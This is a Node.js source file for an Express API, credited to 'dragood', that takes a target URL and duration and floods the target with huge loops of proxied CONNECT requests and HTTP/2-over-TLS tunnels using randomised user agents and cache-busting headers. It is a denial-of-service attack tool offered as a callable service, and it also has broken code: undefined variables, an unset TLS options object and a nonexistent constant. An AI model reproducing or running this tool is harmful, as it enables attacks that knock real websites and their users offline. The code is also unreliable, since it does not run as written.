const express = require('express');
const app = express();
const { exec } = require('child_process');
require('events').defaultMaxListeners = 0;
process.setMaxListeners(0);
const fs = require('fs');
const url = require('url');
const http = require('http');
const { Agent } = require('http');
const keepAliveAgent = new Agent({
  keepAlive: true,
  maxSockets: 50,
  maxFreeSockets: 10,
  timeout: 60000,
  freeSocketTimeout: 30000,
});
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');
tls.DEFAULT_ECDH_CURVE;
let payload = {};
const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
];
let SignalsList = sigalgs.join(':');
try {
  var UAs = fs.readFileSync('ua.txt', 'utf-8')
    .replace(/\r/g, '')
    .split('\n');
} catch (error) {
  console.log('Where the fuckin useragent file: ua.txt')
}
class TlsBuilder {
  constructor(socket) {
    this.curve = "GREASE:X25519:x25519"; 
    this.sigalgs = SignalsList;
    this.Opt =
      crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_NO_TICKET |
      crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_COMPRESSION |
      crypto.constants.SSL_OP_NO_RENEGOTIATION |
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
      crypto.constants.SSL_OP_TLSEXT_PADDING |
      crypto.constants.SSL_OP_ALL |
      crypto.constants.SSLcom;
  }
  Alert() {}

  http2TUNNEL(socket, objetive, time) {
    socket.setKeepAlive(true, 1000);
    socket.setTimeout(10000);

    const tlsSocket = tls.connect(this.tlsOptions, () => {
      console.log('TLS connection established');
      console.log(`Cipher: ${tlsSocket.getCipher()}`);
      console.log(`Protocol: ${tlsSocket.getProtocol()}`);
    });
    tlsSocket.setSocket(socket);

    payload[':method'] = 'GET';
    payload['Referer'] = objetive;
    payload['User-agent'] = UAs[Math.floor(Math.random() * UAs.length)];
    payload['Cache-Control'] =
      'no-cache, no-store,private, max-age=0, must-revalidate';
    payload['Pragma'] =
      'no-cache, no-store,private, max-age=0, must-revalidate';
    payload['client-control'] = 'max-age=43200, s-max-age=43200';
    payload['Upgrade-Insecure-Requests'] = 1;
    payload['Accept'] =
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    payload['Accept-Encoding'] = 'gzip, deflate, br';
    payload['Accept-Language'] = 'utf-8, iso-8859-1;q=0.5, *;q=0.1';
    payload[':path'] = parsed.path;

    const tunnel = http2.connect(parsed.href, {
      createConnection: () => tlsSocket, 
    });

    setTimeout(() => {
      tunnel.close();
      console.log('Attack completed');
    }, time * 1000);
  }
}

function Runner(objetive, time) {
  const parsed = url.parse(objetive);
  const reqOptions = {
    host: parsed.host,
    timeout: 10000,
    method: 'CONNECT',
    agent: keepAliveAgent,
    path: parsed.host + ':443',
  };

  for (let i = 0; i < 999999999; i++) {
    const req = http.get(reqOptions, (res) => {
      res.resume();
      res.on('end', () => {
        req.end();
      });

      res.on('connect', (_, socket) => {
        // Pass objetive, time to http2TUNNEL()
        new TlsBuilder().http2TUNNEL(socket, parsed, time);
      });

      res.on('error', (e) => {
        console.log(`ERROR: ${e.message}`);
        req.abort();
      });
    });

    req.on('error', (e) => {
      console.log(`ERROR: ${e.message}`);
    });
  }
}

app.get('/api', (req, res) => {
  let target = req.query.url;
  let time = req.query.time;
  if (!target || !time || isNaN(parseInt(time, 10))) {
    res.status(400).send('Invalid');
    return;
  }
  try {
    objetive = url.parse(objetive);
  } catch (error) {
    console.log('Respone by fuckin api: ERROR.');
    res.status(500).send('Fuck you mom and read the fuckin text: Cannot parse URL');
    return;
  }

  Runner(objetive, time);

 
  res.send('API response');
});

const port = 3000;
app.listen(port, () => console.log(`cổng: ${port}\n\nApi by dragood`));
